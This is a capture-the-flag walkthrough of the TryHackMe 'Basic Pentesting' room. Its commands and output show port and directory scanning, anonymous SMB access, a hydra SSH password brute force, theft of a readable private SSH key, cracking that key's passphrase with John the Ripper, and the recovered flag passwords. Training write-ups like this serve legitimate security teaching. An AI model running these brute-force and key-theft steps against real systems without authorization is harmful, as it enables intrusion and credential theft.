# Basic Pentesting

* Link: https://tryhackme.com/room/basicpentestingjt
* Difficulty: Easy
* Points: 300

> Find the services exposed by the machine

```sh
rustscan -a 10.10.42.49
```

> What is the name of the hidden directory on the web server(enter name without /)?

```sh
gobuster dir -u 10.10.42.49 -w /usr/share/wordlists/dirb/common.txt
```

**Answer**: development

> User brute-forcing to find the username & password

> What is the username?

```sh
smbclient -L 10.10.42.49
```

```
Enter WORKGROUP\kali's password:

        Sharename       Type      Comment
        ---------       ----      -------
        Anonymous       Disk
        IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
SMB1 disabled -- no workgroup available
```

```sh
smbclient "//10.10.42.49/Anonymous"
```

```
smb: \> ls
  .                                   D        0  Thu Apr 19 13:31:20 2018
  ..                                  D        0  Thu Apr 19 13:13:06 2018
  staff.txt                           N      173  Thu Apr 19 13:29:55 2018

                14318640 blocks of size 1024. 11093976 blocks available
smb: \> get staff.txt
getting file \staff.txt of size 173 as staff.txt (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)
```

```sh
cat staff.txt
```

```
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay
```

**Answer**: Jan

> What is the password?

```sh
hydra -l jan -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.10.42.49 -t 4 ssh
```

**Answer**: armando

> What service do you use to access the server(answer in abbreviation in all caps)?

**Answer**: SSH

> Enumerate the machine to find any vectors for privilege escalation

We can use `scp` to copy a script like [LinEnum.sh](https://github.com/rebootuser/LinEnum) to our target machine.

```sh
scp /opt/LinEnum/LinEnum.sh jan@10.10.42.49:/dev/shm
```

LinEnum shows us another user on the target system: "kay".

> What is the name of the other user you found(all lower case)?

**Answer**: kay

> If you have found another user, what can you do with this information?

We can take a look at their /home/ directory:

```sh
ls -al /home/kay/
```

```
total 48
drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 .
drwxr-xr-x 4 root root 4096 Apr 19  2018 ..
-rw------- 1 kay  kay   756 Apr 23  2018 .bash_history
-rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout
-rw-r--r-- 1 kay  kay  3771 Apr 17  2018 .bashrc
drwx------ 2 kay  kay  4096 Apr 17  2018 .cache
-rw------- 1 root kay   119 Apr 23  2018 .lesshst
drwxrwxr-x 2 kay  kay  4096 Apr 23  2018 .nano
-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
-rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile
drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh
-rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful
-rw------- 1 root kay   538 Apr 23  2018 .viminfo
```

```sh
ls -al /home/kay/.ssh/
```

```
total 20
drwxr-xr-x 2 kay kay 4096 Apr 23  2018 .
drwxr-xr-x 5 kay kay 4096 Apr 23  2018 ..
-rw-rw-r-- 1 kay kay  771 Apr 23  2018 authorized_keys
-rw-r--r-- 1 kay kay 3326 Apr 19  2018 id_rsa
-rw-r--r-- 1 kay kay  771 Apr 19  2018 id_rsa.pub
```

The file /home/kay/.ssh/id_rsa seems to be readable!

We copy it to our host system and try to establish a SSH connection as the user "kay":

```sh
chmod 600 /tmp/kay.id_rsa
ssh -i /tmp/kay.id_rsa kay@10.10.42.49
```

```
Enter passphrase for key '/tmp/kay.id_rsa':
```

The private key seems to be password protected. We can use John the Ripper to brute force it. First, we need to convert the RSA key into a format that `john` can understand.

```sh
/usr/share/john/ssh2john.py /tmp/kay.id_rsa | tee /tmp/kay.id_rsa.john
```

```sh
john /tmp/kay.id_rsa.john
```

```
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
Proceeding with incremental:ASCII
beeswax          (/tmp/kay.id_rsa)
```

We find out that the password for "kay" is "beeswax".

> What is the final password you obtain?

```sh
ssh -i /tmp/kay.id_rsa kay@10.10.42.49
```

We use the password "beeswax".

```sh
ls -l
```

```
total 4
-rw------- 1 kay kay 57 Apr 23  2018 pass.bak
```

```sh
cat pass.bak
```

```
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```

**Answer**: heresareallystrongpasswordthatfollowsthepasswordpolicy$$
